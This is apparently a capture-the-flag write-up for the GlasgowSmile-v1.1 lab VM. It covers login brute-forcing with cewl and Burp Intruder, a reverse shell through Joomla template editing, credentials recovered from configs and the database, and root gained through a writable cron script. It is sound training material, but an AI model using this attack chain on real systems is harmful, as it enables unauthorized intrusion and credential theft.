# GlasgowSmile-v1.1 writeup
Let's start with a network scan
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                
                                                                                                                                                                                                              
 20 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1200                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      2     120  Unknown vendor                                                                                                                                             
 192.168.0.1     f0:a7:31:e9:bb:f8      7     420  TP-Link Systems Inc                                                                                                                                        
 192.168.0.127   00:0c:29:0b:ba:ab      2     120  VMware, Inc.
```
\
Next , Open ports 
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
lets open port 80 on browser
\
<img width="1684" height="742" alt="image" src="https://github.com/user-attachments/assets/9328692a-03b0-4e59-92b4-8928c644c76c" />
\
Nothing much here , so i use dirb
```bash
dirb http://192.168.0.127

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb  1 13:06:56 2026
URL_BASE: http://192.168.0.127/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.127/ ----
+ http://192.168.0.127/index.html (CODE:200|SIZE:125)                                                                                                                                                         
==> DIRECTORY: http://192.168.0.127/joomla/                                                                                                                                                                   
+ http://192.168.0.127/server-status (CODE:403|SIZE:278)                                                                                                                                                      
                                                                                                                                                                                                              
---- Entering directory: http://192.168.0.127/joomla/ ----
==> DIRECTORY: http://192.168.0.127/joomla/administrator/                                                                                                                                                     
==> DIRECTORY: http://192.168.0.127/joomla/bin/                                                                                                                                                               
==> DIRECTORY: http://192.168.0.127/joomla/cache/                                                                                                                                                             
==> DIRECTORY: http://192.168.0.127/joomla/components/                                                                                                                                                        
==> Testing: http://192.168.0.127/joomla/customer_login                                                                                                                                                       

```
\
<img width="1386" height="744" alt="image" src="https://github.com/user-attachments/assets/a60c1d19-2087-4e3d-b3db-c9d1b711d272" />
\
So i used joomscan to find version of joomla 
```bash
joomscan -u http://192.168.0.127/joomla/
```
```bash

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.0.127/joomla/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.0.127/joomla/administrator/components
http://192.168.0.127/joomla/administrator/modules
http://192.168.0.127/joomla/administrator/templates
http://192.168.0.127/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.0.127/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.0.127/joomla/robots.txt 

Interesting path found from robots.txt
http://192.168.0.127/joomla/joomla/administrator/                                                                                                                                                              
http://192.168.0.127/joomla/administrator/                                                                                                                                                                     
http://192.168.0.127/joomla/bin/                                                                                                                                                                               
http://192.168.0.127/joomla/cache/                                                                                                                                                                             
http://192.168.0.127/joomla/cli/                                                                                                                                                                               
http://192.168.0.127/joomla/components/                                                                                                                                                                        
http://192.168.0.127/joomla/includes/                                                                                                                                                                          
http://192.168.0.127/joomla/installation/                                                                                                                                                                      
http://192.168.0.127/joomla/language/                                                                                                                                                                          
http://192.168.0.127/joomla/layouts/                                                                                                                                                                           
http://192.168.0.127/joomla/libraries/                                                                                                                                                                         
http://192.168.0.127/joomla/logs/                                                                                                                                                                              
http://192.168.0.127/joomla/modules/                                                                                                                                                                           
http://192.168.0.127/joomla/plugins/                                                                                                                                                                           
http://192.168.0.127/joomla/tmp/                                                                                                                                                                               
                                                                                                                                                                                                               
                                                                                                                                                                                                               
[+] Finding common backup files name                                                                                                                                                                           
[++] Backup files are not found                                                                                                                                                                                
                                                                                                                                                                                                               
[+] Finding common log files name                                                                                                                                                                              
[++] error log is not found                                                                                                                                                                                    
                                                                                                                                                                                                               
[+] Checking sensitive config.php.x file                                                                                                                                                                       
[++] Readable config files are not found                                                                                                                                                                       
                                                                                                                                                                                                               
                                                                                                                                                                                                               
Your Report : reports/192.168.0.127/
```
WE see that it's version is Joomla 3.7.3rc1 , i check for searchsploit which had some sqlinjection vulns , but none of them worked , so i was back to square one.
\
Then i realized that there was a login panel at "/joomla/administrator"
\
I check online for default credentials of joomla , and most of them had "joomla" as the user , so i tried default passwords but didnt work.
\
So i decided to create a wordlist using cewl ("https://www.kali.org/tools/cewl/") on the home page of joomla since there were some dialogues which the author mmight have hinted as a story.
```bash
cewl -m 5 http://192.168.0.127/joomla/ > crawl-words.txt
```
\
Then i capture the login request in burp and forward it to intruder tab and set sniper mode
\
<img width="1657" height="680" alt="image" src="https://github.com/user-attachments/assets/32aec999-abac-4caf-977d-3396292c4c76" />
\
After running intruder , we can see that one Password gave a different response size , so it must be the correct one
\
<img width="1439" height="232" alt="image" src="https://github.com/user-attachments/assets/b2444031-db58-4003-a82e-dcdb2964d4df" />
\
After logging in
\
<img width="1672" height="799" alt="image" src="https://github.com/user-attachments/assets/e57e6da8-c277-4d0c-80dc-06d6b64e180f" />
\
To get remote code execution in joomla with administrator permissions , we need tto go to templates on the left tab
\
<img width="167" height="126" alt="image" src="https://github.com/user-attachments/assets/cec05820-0041-488f-bef8-513eec13aedd" />
\
Then click on templates on the left again
\
<img width="1674" height="322" alt="image" src="https://github.com/user-attachments/assets/c22ebdfe-e7c4-4e39-8e8e-e287cdb4775b" />
\

<img width="1679" height="553" alt="image" src="https://github.com/user-attachments/assets/2c63f5e1-4eb7-485b-b693-ac019e12a348" />
\
Then click on templates on the left again and click prostar
\
It lets us edit files , so from the left , i choose index.php to edit
\
<img width="1662" height="701" alt="image" src="https://github.com/user-attachments/assets/59359fc8-1670-499e-a794-b60de85f5068" />
\
And then accessing "http://192.168.0.127/joomla/index.php" will give the reverse shell
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from glasgowsmile~192.168.0.127-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/glasgowsmile~192.168.0.127-Linux-x86_64/2026_02_01-13_29_43-752.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@glasgowsmile:/$ 
```
\
And first , i check for users
```bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
rob:x:1000:1000:rob,,,:/home/rob:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
abner:x:1001:1001:Abner,,,:/home/abner:/bin/bash
penguin:x:1002:1002:Penguin,,,:/home/penguin:/bin/bash
```
\
I searched the file system for some time , then checked the /var/www/joomla2 directory's configuration file and got credentials of database
```bash
public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
        public $dbprefix = 'jnqcu_';
        public $live_site = '';
        public $secret = 'fNRyp6KO51013435';
```
\
Let's access mysql n check
```bash
mysql -u joomla -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 6045
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.002 sec)

MariaDB [(none)]> use batjoke
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [batjoke]> select * from equipment;
Empty set (0.000 sec)

MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.000 sec)
```
\
So here we got the password of user "rob" 
\
Decoding it gives 
```bash
echo "Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/" | base64 -d
???AllIHaveAreNegativeThoughts???
```
\
```bash
rob@glasgowsmile:~$ ls -la
total 52
drwxr-xr-x 3 rob  rob  4096 Jun 16  2020 .
drwxr-xr-x 5 root root 4096 Jun 15  2020 ..
-rw-r----- 1 rob  rob   454 Jun 14  2020 Abnerineedyourhelp
-rw------- 1 rob  rob     7 Feb  1 11:16 .bash_history
-rw-r--r-- 1 rob  rob   220 Jun 13  2020 .bash_logout
-rw-r--r-- 1 rob  rob  3526 Jun 13  2020 .bashrc
-rw-r----- 1 rob  rob   313 Jun 14  2020 howtoberoot
drwxr-xr-x 3 rob  rob  4096 Jun 13  2020 .local
-rw------- 1 rob  rob    81 Jun 15  2020 .mysql_history
-rw-r--r-- 1 rob  rob   807 Jun 13  2020 .profile
-rw-r--r-- 1 rob  rob    66 Jun 15  2020 .selected_editor
-rw-r----- 1 rob  rob    38 Jun 13  2020 user.txt
-rw------- 1 rob  rob   429 Jun 16  2020 .Xauthority
```
So we become rob and get the first user file
```bash
rob@glasgowsmile:~$ cat user.txt 
JKR[f5bb11acbb957915e421d62e7253d27a]
```
\
Next , there are two more interesting files
\
```bash
cat Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
rob@glasgowsmile:~$ cat howtoberoot 
  _____ ______   __  _   _    _    ____  ____  _____ ____  
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \ 
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ < 
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

NO HINTS.
```
\
So i checked this encoded cipher in cipher identifier and found that it was a rot cipher
```bash
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
```
\
So decoding it gives
```bash
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG4wZTk0bXkwZGVhdGgwMDBtYWtlczQ5bW4yZThjZW05czAwdGhhbjBteTBsaWZlMA==
```
```bash
echo "STMzaG4wZTk0bXkwZGVhdGgwMDBtYWtlczQ5bW4yZThjZW05czAwdGhhbjBteTBsaWZlMA==" | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
```
\
so lets switch to abner and get our 2nd user flag
```bash
abner@glasgowsmile:/home$ cd ~
abner@glasgowsmile:~$ ls -la
total 44
drwxr-xr-x 4 abner abner 4096 Jun 16  2020 .
drwxr-xr-x 5 root  root  4096 Jun 15  2020 ..
-rw------- 1 abner abner  167 Feb  1 11:16 .bash_history
-rw-r--r-- 1 abner abner  220 Jun 14  2020 .bash_logout
-rw-r--r-- 1 abner abner 3526 Jun 14  2020 .bashrc
-rw-r----- 1 abner abner  565 Jun 16  2020 info.txt
drwxr-xr-x 3 abner abner 4096 Jun 14  2020 .local
-rw-r--r-- 1 abner abner  807 Jun 14  2020 .profile
drwx------ 2 abner abner 4096 Jun 15  2020 .ssh
-rw-r----- 1 abner abner   38 Jun 16  2020 user2.txt
-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
abner@glasgowsmile:~$ cat user2.txt 
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
abner@glasgowsmile:~$ cat info.txt 
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
```
\
And also , while checking for files owned by abner , we got these 
```bash
-rw-r--r-- 1 abner abner 262965 Jun 15  2020 /var/www/html/joker.jpg
-rwxr-xr-x 1 abner abner    516 Jun 16  2020 /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
```
\
The zip file was asking a password , so i used the same password as abner and it worked 
```bash
cat dear_penguins          
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
```
\
Now with the password found , we switch to the user "penguin"
```bash
penguin@glasgowsmile:~$ ls -la *
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
```
```bash
cd ../SomeoneWhoHidesBehindAMask/
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat PeopleAreStartingToNotice.txt 
Hey Penguin,
I'm writing software, I can't make it work because of a permissions issue. It only runs with root permissions. When it's complete I'll copy it to this folder.

Joker

  _____    _____      __      _   __   ________       _____   ________      ______     _____     ____     __    __   ________    _____   _________   __    __   _____       ______   
 (_   _)  / ____\    /  \    / ) (  ) (___  ___)     (_   _) (___  ___)    (_   _ \   / ___/    (    )    ) )  ( (  (___  ___)  (_   _) (_   _____)  ) )  ( (  (_   _)     (_____ \  
   | |   ( (___     / /\ \  / /   \/      ) )          | |       ) )         ) (_) ) ( (__      / /\ \   ( (    ) )     ) )       | |     ) (___    ( (    ) )   | |          ___) ) 
   | |    \___ \    ) ) ) ) ) )          ( (           | |      ( (          \   _/   ) __)    ( (__) )   ) )  ( (     ( (        | |    (   ___)    ) )  ( (    | |         (  __/  
   | |        ) )  ( ( ( ( ( (            ) )          | |       ) )         /  _ \  ( (        )    (   ( (    ) )     ) )       | |     ) (       ( (    ) )   | |   __     )_)    
  _| |__  ___/ /   / /  \ \/ /           ( (          _| |__    ( (         _) (_) )  \ \___   /  /\  \   ) \__/ (     ( (       _| |__  (   )       ) \__/ (  __| |___) )    __     
 /_____( /____/   (_/    \__/            /__\        /_____(    /__\       (______/    \____\ /__(  )__\  \______/     /__\     /_____(   \_/        \______/  \________/    (__)    



penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt 
JKR{284a3753ec11a592ee34098b8cb43d52}
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

 
exit 0

```
\
Now after some time , i couldnt find anything , so i ran pspy and found 
\
<img width="940" height="87" alt="image" src="https://github.com/user-attachments/assets/8bf9516b-46d1-4218-a125-af52b1af9898" />
\
.trash_old is being run by root, so we can easily get a root shell if we change the contents of the file 
\
We use nano to edit and keep a reverse shell payload before the "exit 0"
\
<img width="753" height="359" alt="image" src="https://github.com/user-attachments/assets/a9e5e7e0-a80d-467e-9b43-30928a8cceb8" />
\
Now on the listener , we get a root shell after waiting for some time
```bash
penelope -p 4445    
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from glasgowsmile~192.168.0.127-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/glasgowsmile~192.168.0.127-Linux-x86_64/2026_02_01-14_07_01-472.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@glasgowsmile:~# id
uid=0(root) gid=0(root) groups=0(root)
root@glasgowsmile:~# ls -la
total 48
drwx------  3 root root 4096 Jun 16  2020 .
drwxr-xr-x 18 root root 4096 Jun 13  2020 ..
-rw-------  1 root root    7 Feb  1 11:16 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rwxr-x--x  1 root root  867 Jun 16  2020 .clean.sh
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-------  1 root root 3862 Jun 15  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root 1863 Jun 14  2020 root.txt
-rw-r--r--  1 root root   66 Jun 13  2020 .selected_editor
-rw-r--r--  1 root root  165 Jun 13  2020 .wget-hsts
-rw-r--r--  1 root root   24 Jun 16  2020 whoami
root@glasgowsmile:~# cat root.txt 
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
```
The end , thank you for reading till here
